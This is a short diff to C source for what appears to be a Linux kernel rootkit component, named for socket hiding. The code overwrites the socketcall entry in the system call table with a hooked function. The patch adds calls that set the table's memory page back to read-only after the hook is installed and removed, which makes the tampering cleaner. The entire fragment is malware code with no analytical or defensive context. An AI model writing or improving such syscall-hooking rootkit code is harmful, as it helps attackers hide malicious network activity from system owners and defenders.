@@ -116,6 +116,7 @@ void load_sockethiding(void){
     orig_socketcall = (fun_long_int_unsigned_long)syscall_table[__NR_socketcall];
     make_page_writable((long unsigned int)ptr_sys_call_table);
     syscall_table[__NR_socketcall] = hooked_socketcall;
+    make_page_readonly((long unsigned int)ptr_sys_call_table);
 }
 
 void unload_sockethiding(void){
@@ -139,5 +140,7 @@ void unload_sockethiding(void){
     }
 
     syscall_table = (void**) ptr_sys_call_table;
+    make_page_writable((long unsigned int)ptr_sys_call_table);
     syscall_table[__NR_socketcall] = orig_socketcall;
+    make_page_readonly((long unsigned int)ptr_sys_call_table);
 }
